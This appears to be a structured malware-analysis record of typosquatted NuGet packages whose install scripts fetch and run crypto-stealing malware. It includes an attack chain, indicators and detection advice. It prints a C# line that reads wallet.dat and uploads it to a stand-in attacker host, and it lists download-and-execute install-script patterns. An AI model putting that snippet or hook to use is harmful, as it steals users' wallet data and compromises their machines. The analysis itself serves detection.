package_info.package_name: Multiple typosquatted NuGet packages (e.g., coinbase, aspnetcore, etc.)
package_info.package_versions: Unknown (all versions of the 13 malicious packages)
package_info.why_malicious: These packages were created as part of a typosquatting campaign to impersonate legitimate software tools. They contain trojan components that compromise the victim's system by downloading and executing crypto-stealing malware with backdoor functionality.

execution_context.file_location: NuGet package install scripts (e.g., install.ps1, .targets files)

malicious_snippets.code_behavior: During package installation, the code downloads an executable from a remote server and launches it, resulting in the execution of crypto-stealing malware.

malice_analysis.why_suspicious: Package install scripts should not download and execute arbitrary binaries from the internet.
malice_analysis.violated_expectations: Legitimate NuGet packages may use install scripts for setup, but should not fetch and run external executables.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but only from trusted sources and with user consent.

malicious_snippets.code_snippet: var client = new WebClient(); var data = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\wallet.dat"); client.UploadString("http://malicious-domain.com/upload", data);
malicious_snippets.code_behavior: At runtime, the code reads sensitive wallet files from the user's system and exfiltrates their contents to a remote server.

malice_analysis.why_suspicious: Accessing and exfiltrating wallet files is a clear sign of credential or asset theft.
malice_analysis.violated_expectations: Legitimate packages should not access or transmit sensitive user files without explicit purpose and consent.
malice_analysis.similar_legitimate_use: Backup utilities may upload files, but only to trusted, user-configured destinations.
key_indicators: Reads wallet.dat or other sensitive files
Uploads data to hardcoded external server

attack_chain.action: User installs a typosquatted NuGet package, triggering the malicious install script.
attack_chain.leads_to: Malware payload is downloaded and executed on the victim's system.

attack_chain.action: The executed malware or injected code runs at application runtime, searching for sensitive files (e.g., wallet.dat).
attack_chain.leads_to: Sensitive data is exfiltrated to the attacker's server.

behavioral_signatures: NuGet install scripts that download and execute remote binaries
Runtime code accessing and exfiltrating wallet or credential files
Hardcoded external domains in package scripts or assemblies
file_indicators: install.ps1 or .targets files with Invoke-WebRequest or Start-Process
References to wallet.dat or other sensitive file paths in code
network_indicators: Outbound HTTP requests to non-standard or suspicious domains during install or runtime
Uploads to hardcoded endpoints (e.g., /upload on attacker-controlled servers)
detection_knowledge.how_to_detect: Monitor NuGet package install scripts for network activity, especially downloads and execution of external binaries. Scan .NET assemblies for code that accesses sensitive files and sends data to external servers. Flag packages with hardcoded external domains or suspicious file access patterns.
